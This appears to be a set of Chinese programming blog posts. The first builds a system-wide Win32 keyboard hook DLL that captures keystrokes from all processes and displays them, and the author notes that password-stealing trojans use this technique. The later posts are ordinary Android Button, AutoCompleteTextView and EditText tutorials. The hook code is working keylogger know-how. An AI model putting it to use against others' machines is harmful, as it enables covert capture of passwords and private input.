<p>下面通过一个实例说明一下键盘钩子</p>
<h2 id="键盘钩子"><a href="#键盘钩子" class="headerlink" title="键盘钩子"></a>键盘钩子</h2><p>键盘钩子其实就是对键盘按下是的截获，之前一下垃圾盗号木马之类的应该就是截获这些鼠标钩子，如果我们截获的钩子不是当前我们的软件，而是想对某个进程或者系统进行截获，那就要用到DLL，因为DLL比较容易映射到别的进程中。</p>
<p>首先看一下程序的样子:<br><img src="img1.jpg" alt="效果图"></p>
<p>就是我们输入的内容都会被打印出来（但是我没有明确的进行大小写的区分，而是只根据lParam的扫描码直接输出的）。</p>
<h3 id="DLL部分编写"><a href="#DLL部分编写" class="headerlink" title="DLL部分编写"></a>DLL部分编写</h3><p>首先是我们要编写我们的DLL文件，新建一个之后我们在dllmain.cpp中进行编写。</p>
<p>头文件的定义我们需要先看一下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> KEYHOOKLIB_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYHOOKLIB_API __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYHOOKLIB_API __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HM_KEY WM_USER+101</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL KEYHOOKLIB_API WINAPI <span class="title">SetHookkey</span><span class="params">(BOOL bInstall,DWORD dwThread = <span class="number">0</span> ,HWND hWndCaller = <span class="literal">NULL</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>首先先是判断是不是定义了那个导出宏，如果定义了的话呢我们就将其设置为导出，如果不是的话呢我们就将其设置为导入，这样写方便我们在主程序中进行编写。<br>然后定义一个消息，用来接收我们发送接收键盘的信息。<br>在定义唯一一个导出函数，就是设置钩子。</p>
<p>然后我们在cpp文件引入如下内容：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYHOOKLIB_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"KeyMonitor.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"Wker"</span>)<span class="comment">//这里的必须初始化,否无效</span></span></span><br><span class="line">HWND g_hWndCaller = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br></pre></td></tr></table></figure>
<p>显示定义导出的宏，为了告诉编译器我们这个是要导出的函数，然后我们在设置一个区段，区段的内容必须初始化。这里设置区段是因为我们要讲我们的钩子放入别的程序中的时候我们的这个全局的变量如果不在一个我们自己的区段的话呢，那么每次被映射过去，我们的值都是没有了的。</p>
<p>首先是我们需要编写一个函数，使用来获取DLL实例句柄的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HMODULE WINAPI <span class="title">ModuleFromAddress</span><span class="params">(PVOID pv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MEMORY_BASIC_INFORMATION mib;</span><br><span class="line">	<span class="keyword">if</span> (VirtualQuery(pv,&amp;mib,<span class="keyword">sizeof</span>(mib)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (HMODULE)mib.AllocationBase;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>VirtualQuery</code>这个函数我们查询出要查询的内存地址各种信息，然后我们返回相对应的一个基地址。</p>
<p>然后我们就编写钩子函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyHookProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">int</span> nCode,      <span class="comment">// hook code passed to hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">	WPARAM wParam,  <span class="comment">// value passed to hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPARAM lParam   <span class="comment">// value passed to hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nCode &lt; <span class="number">0</span> || nCode == HC_NOREMOVE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(g_hHook,nCode,wParam,lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lParam &amp; <span class="number">0X40000000</span>)<span class="comment">//如果在发送消息之前键关闭</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(g_hHook,nCode,wParam,lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	PostMessage(g_hWndCaller,HM_KEY,wParam,lParam);</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook,nCode,wParam,lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先如果小于0或者等于HC_NOREMOVE的时候是不行的。<br>MSDN说明：如果代码小于0，则钩子子程必须将消息传递给CallNextHookEx函数，而无需进一步处理，并且应该返回由CallNextHookEx返回的值。<br>HC_NOREMOVE：这个好像就是说这个消息没有被移除，具体为什么不要这个消息，这个我现在没怎么去深究。</p>
<p>然后看下lParam：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0–15</td>
<td>Specifies the repeat count. The value is the number of times the keystroke is repeated as a result of the user’s holding down the key.</td>
</tr>
<tr>
<td>16–23</td>
<td>Specifies the scan code. The value depends on the original equipment manufacturer (OEM).</td>
</tr>
<tr>
<td>24</td>
<td>Specifies whether the key is an extended key, such as a function key or a key on the numeric keypad. The value is 1 if the key is an extended key; otherwise, it is 0.</td>
</tr>
<tr>
<td>25–28</td>
<td>Reserved.</td>
</tr>
<tr>
<td>29</td>
<td>Specifies the context code. The value is 1 if the alt key is down; otherwise, it is 0.</td>
</tr>
<tr>
<td>30</td>
<td>Specifies the previous key state. The value is 1 if the key is down before the message is sent; it is 0 if the key is up.</td>
</tr>
<tr>
<td>31</td>
<td>Specifies the transition state. The value is 0 if the key is being pressed and 1 if it is being released.</td>
</tr>
</tbody></table>
<p>我们用0X40000000和他进行与操作，就是为了判断第三十位是不是0，如果在发送消息之前进行了关闭，那么我们就不接受这个东西了。<br>然后我们将我们接受到的消息发送给我们的窗口句柄。<br>最后返回值需要注意，返回0的话呢好像是截断，不继续传递下去了，如果要继续传递下去，那么就要<code>return CallNextHookEx(g_hHook,nCode,wParam,lParam);</code>。</p>
<p>设置钩子函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">SetHookkey</span><span class="params">(BOOL bInstall,DWORD dwThread <span class="comment">/* = 0  */</span>,HWND hWndCaller <span class="comment">/* = NULL */</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bOK;</span><br><span class="line">	g_hWndCaller = hWndCaller;</span><br><span class="line">	<span class="keyword">if</span> (bInstall)</span><br><span class="line">	&#123;</span><br><span class="line">		g_hHook = SetWindowsHookEx(WH_KEYBOARD,KeyHookProc,ModuleFromAddress(KeyHookProc),dwThread);</span><br><span class="line">		bOK = (g_hHook != <span class="literal">NULL</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		bOK = UnhookWindowsHookEx(g_hHook);</span><br><span class="line">		g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bOK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的话呢用到我们之前写的那个函数，这里有一点需要注意的就是，dwThread    如果是0的话呢就是系统。</p>
<p>然后我们写一下我们的配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">	SetHookkey</span><br><span class="line">SECTIONS</span><br><span class="line">	Wker Read Write Shared</span><br></pre></td></tr></table></figure>
<p>编写好之后我们，我们就生成一下解决方案。<br>我们这里先用静态的方式打开DLL，不要忘记lib文件。</p>
<h3 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h3><p>我们在主程序中进行导入：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../KeyMonitor/KeyMonitor.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">"KeyMonitor.lib"</span>)</span></span><br></pre></td></tr></table></figure>
<p>导入我哦们的动态链接库和头文件，因为我们没有定义那个导出宏，所以我们这里的话呢就是导入。</p>
<p>然后加入一个Edit control，用来记录我们的信息。</p>
<p>首先在我们的初始化函数中加载钩子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CMainKeyMonitorDlg::OnInitDialog()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line">	<span class="comment">//  执行此操作</span></span><br><span class="line">	SetIcon(m_hIcon, TRUE);			<span class="comment">// 设置大图标</span></span><br><span class="line">	SetIcon(m_hIcon, FALSE);		<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!SetHookkey(TRUE,<span class="number">0</span>,m_hWnd))</span><br><span class="line">		MessageBox(<span class="string">"钩子加载失败"</span>);</span><br><span class="line">	retur</span><br></pre></td></tr></table></figure>

<p>加载完毕钩子之后，在我们窗口销毁的时候销毁钩子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMainKeyMonitorDlg::OnDestroy()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnDestroy();</span><br><span class="line">	SetHookkey(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们将我们的消息进行映射：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">afx_msg LRESULT CMainKeyMonitorDlg::OnHmKey(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">80</span>];</span><br><span class="line">	GetKeyNameText(lParam,szKey,<span class="number">80</span>);</span><br><span class="line">	CString str,edit;</span><br><span class="line">	str.Format(<span class="string">"用户按键:%s\r\n"</span>,szKey);</span><br><span class="line">	GetDlgItemText(IDC_RECEDIT,edit);</span><br><span class="line">	SetDlgItemText(IDC_RECEDIT,str+edit);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>GetKeyNameText</code>这个函数获得我们的输入内容。</p>
<hr>
<p>钩子类型更有很多，这里先就记录一下这个吧。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Button事件</title>
    <url>/2020/02/04/Android-Button%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="按钮常用事件枚举"><a href="#按钮常用事件枚举" class="headerlink" title="按钮常用事件枚举"></a>按钮常用事件枚举</h1><p>其实这些都是比较基本的，和点击事件之类的很像，学会一个其实就可以举一反三了，而且按钮是继承于TextView的。</p>
<h2 id="布局的一些操作"><a href="#布局的一些操作" class="headerlink" title="布局的一些操作"></a>布局的一些操作</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/Button02"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_alignTop</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginLeft</span>=<span class="string">"24dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginTop</span>=<span class="string">"42dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">	    </span></span><br><span class="line"><span class="tag">	    </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:drawableLeft</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:drawablePadding</span>=<span class="string">"30dip"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:drawableTop</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	    </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个<code>drawableLeft</code>就是左边图片的资源，<code>drawablePadding</code>这个是图片和文字的距离。</p>
<hr>
<p>下面java代码用到的布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/AtEdit1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignParentBottom</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginBottom</span>=<span class="string">"168dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_above</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignRight</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginBottom</span>=<span class="string">"37dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tv_01 = (TextView) findViewById(R.id.Button01);</span><br><span class="line">Tv_01.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">		Button btn = (Button) v;</span><br><span class="line">		<span class="comment">//int WindowsWidth = getWindow().getWindowManager().getDefaultDisplay().getWidth();</span></span><br><span class="line">		<span class="comment">//Log.d("aaa", WindowsWidth+"");</span></span><br><span class="line">		<span class="keyword">if</span>(value == <span class="number">1</span> &amp;&amp; btn.getWidth() &gt;= <span class="number">300</span>)</span><br><span class="line">			value = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(value == -<span class="number">1</span> &amp;&amp; btn.getWidth() &lt; <span class="number">100</span>)</span><br><span class="line">			value = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		btn.setWidth(btn.getWidth() + value*(<span class="keyword">int</span>)(btn.getWidth()*<span class="number">0.1</span>));</span><br><span class="line">		btn.setHeight(btn.getHeight() + value*(<span class="keyword">int</span>)(btn.getHeight()*<span class="number">0.1</span>));</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这个就是一个比较典型的点击事件，就是通过放大缩小来展示的，传进来的View就是事件源。</p>
<h2 id="触摸事件"><a href="#触摸事件" class="headerlink" title="触摸事件"></a>触摸事件</h2><p>就是当你触摸到了就响应的一个事件，具体编写：<br>先要接口<code>implements OnTouchListener</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tv_1.setOnTouchListener(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouch</span><span class="params">(View v, MotionEvent event)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//触摸的时候触发</span></span><br><span class="line">		<span class="keyword">int</span> action = event.getAction();<span class="comment">//事件类型</span></span><br><span class="line">		<span class="keyword">switch</span> (action) &#123;</span><br><span class="line">		<span class="keyword">case</span> MotionEvent.ACTION_DOWN:<span class="comment">//是按下</span></span><br><span class="line">			Tv_1.setBackgroundResource(R.drawable.ic_l1);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MotionEvent.ACTION_UP:<span class="comment">//是抬起</span></span><br><span class="line">			Tv_1.setBackgroundResource(R.drawable.ic_launcher);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;<span class="comment">//事件是否继续传递下去，点击之类的</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这就是触摸换图<br>这里就是说通过event进行判断，是哪种动作，返回值的话呢就是是否继续传递下去，就和那个钩子链差不多。</p>
<h2 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h2><p><code>OnFocusChangeListener</code><br><code>Tv_01.setOnFocusChangeListener(this);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFocusChange</span><span class="params">(View v, <span class="keyword">boolean</span> hasFocus)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(hasFocus)</span><br><span class="line">			Toast.makeText(<span class="keyword">this</span>, <span class="string">"哟焦点了"</span>,Toast.LENGTH_SHORT);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代码实现图文混排"><a href="#代码实现图文混排" class="headerlink" title="代码实现图文混排"></a>代码实现图文混排</h2><p>既然Button是继承于TextView的，那么我们一样可以使用span。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SpannableString span = <span class="keyword">new</span> SpannableString(<span class="string">"代码实现"</span>);</span><br><span class="line">ImageSpan imageSpan = <span class="keyword">new</span> ImageSpan(BitmapFactory.decodeResource(getResources(), R.drawable.ic_l1));</span><br><span class="line">span.setSpan(imageSpan, <span class="number">0</span>, <span class="number">4</span>, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);</span><br><span class="line">Tv_2.setText(span);</span><br><span class="line">Tv_2.append(<span class="string">"我的按钮"</span>);</span><br><span class="line">SpannableString span2 = <span class="keyword">new</span> SpannableString(<span class="string">"代码实现2"</span>);</span><br><span class="line">ImageSpan imageSpan2 = <span class="keyword">new</span> ImageSpan(BitmapFactory.decodeResource(getResources(), R.drawable.ic_l2));</span><br><span class="line">span2.setSpan(imageSpan2, <span class="number">0</span>,<span class="number">4</span>, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);</span><br><span class="line">Tv_2.append(span2);</span><br><span class="line"><span class="comment">//这个是在点击事件里面的</span></span><br></pre></td></tr></table></figure>
<p>首先我们先new一个<code>SpannableString</code>的对象，然后new一个图片的span对象，资源使我们的图片，然后将其放入<code>SpannableString</code>中，然后最终实现其效果，这里需要注意的是：字符长度是Unicode编码，所以中文也是占一个字符的。</p>
<p><img src="img1.gif" alt="实现效果"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>AutoCompleteTextView</title>
    <url>/2020/02/04/AutoCompleteTextView/</url>
    <content><![CDATA[<h2 id="AutoCompleteTextView"><a href="#AutoCompleteTextView" class="headerlink" title="AutoCompleteTextView"></a>AutoCompleteTextView</h2><p>这个东西就是一个就是一个提示文本，但是不知道是什么原因，在我的模拟器上面就是不好用，点击也不响应，可能是模拟器的版本问题吧。<br>首先要先新建一个layout，代码下面：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">AutoCompleteTextView</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">AutoCompleteTextView</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在主layout中编写：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">AutoCompleteTextView</span> </span></span><br><span class="line"><span class="tag">		    <span class="attr">android:id</span>=<span class="string">"@+id/AtEdit1"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:completionThreshold</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:imeOptions</span>=<span class="string">"actionDone"</span></span></span><br><span class="line"><span class="tag">		    /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里面有一些参数<code>completionThreshold</code>，这个就是我们输入一个我们就可以弹出列表。<br>然后我们编写java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AutoCompleteTextView AtEt_1;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">		AtEt_1 = (AutoCompleteTextView) findViewById(R.id.AtEdit1);</span><br><span class="line">		String[] arr = &#123;<span class="string">"Wker"</span>,<span class="string">"Wker酷"</span>,<span class="string">"Wker帅"</span>&#125;;</span><br><span class="line">		ArrayAdapter&lt;String&gt;  adpter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, R.layout.atctext, arr);</span><br><span class="line">		AtEt_1.setAdapter(adpter);</span><br></pre></td></tr></table></figure>
<p>首先先是定义一个数组，里面有我们预先定义的数据，然后new一个ArrayAdapter的类，第一个参数是上下文，第二个参数是我们先前的资源布局，最后一个是我们的数据，最后在设置上。<br>实现效果：<br><img src="img1.jpg" alt="实现效果"><br>但是我这里会崩溃，不知道为什么。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android EditText</title>
    <url>/2020/02/04/Android-EditText/</url>
    <content><![CDATA[<h1 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h1><p>这个东西就是个编辑框，继承于TextView，对输入的东西可以进行验证与限制</p>
<h2 id="输入图片"><a href="#输入图片" class="headerlink" title="输入图片"></a>输入图片</h2><p>就有点像输入一个小表情差不多，不是很难实现，因为集成TextView所以我们一样可以使用<code>SpannableString</code>这个类，基本的实现代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Button btn_1;</span><br><span class="line">	<span class="keyword">private</span> EditText Et_1;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.jmp_activity);</span><br><span class="line">		btn_1 = (Button) findViewById(R.id.button1);</span><br><span class="line">		Et_1 = (EditText) findViewById(R.id.Edit1);</span><br><span class="line">		btn_1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				SpannableString span = <span class="keyword">new</span> SpannableString(<span class="string">"Test"</span>);</span><br><span class="line">				ImageSpan imageSpan = <span class="keyword">new</span> ImageSpan(BitmapFactory.decodeResource(getResources(), R.drawable.ic_l1));</span><br><span class="line">				span.setSpan(imageSpan, <span class="number">0</span>, <span class="number">4</span>, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);</span><br><span class="line">				Et_1.append(span);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们点击按钮的时候，new一个<code>SpannableString</code>然后我们在new一个<code>ImageSpan</code>，在这个构造函数中需要一个Bitmap对象（老版本需要传一个上下文，现在过时了不需要了），我们用<code>BitmapFactory.decodeResource</code>这个进行获取，这个有两个参数：一个资源，另一个是ID，我们设置完成之后，我们就将这个图片span传递给文本span，然后再追加到我哦们的EditText中就可以了。<br><img src="img1.jpg" alt="输入图片"><br>需要注意的是我们<code>SpannableString</code>构造方法中传入的String是代表了我们这个图片，你选中图片之后输入文本就会选中一个Test。</p>
<h2 id="输入内容的限制与校验"><a href="#输入内容的限制与校验" class="headerlink" title="输入内容的限制与校验"></a>输入内容的限制与校验</h2><p>限制：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Edit1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:digits</span>=<span class="string">"abc"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Edit2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:inputType</span>=<span class="string">"number"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>android:digits=&quot;abc&quot;</code>这个的意思就是说我们只能输入abc，<code>android:inputType=&quot;number&quot;</code>这个的意思就是说我们只能输入数字。<br><img src="img2.jpg" alt="只能输入数字"><br>校验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CharSequence t = Et_1.getText().toString();</span><br><span class="line"><span class="keyword">if</span>(TextUtils.isEmpty(t))</span><br><span class="line">&#123;</span><br><span class="line">	Et_1.setError(<span class="string">"你怎么写了个空啊"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="img3.jpg" alt="错误提示"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>TextView more fun</title>
    <url>/2020/02/04/TextView-more-fun/</url>
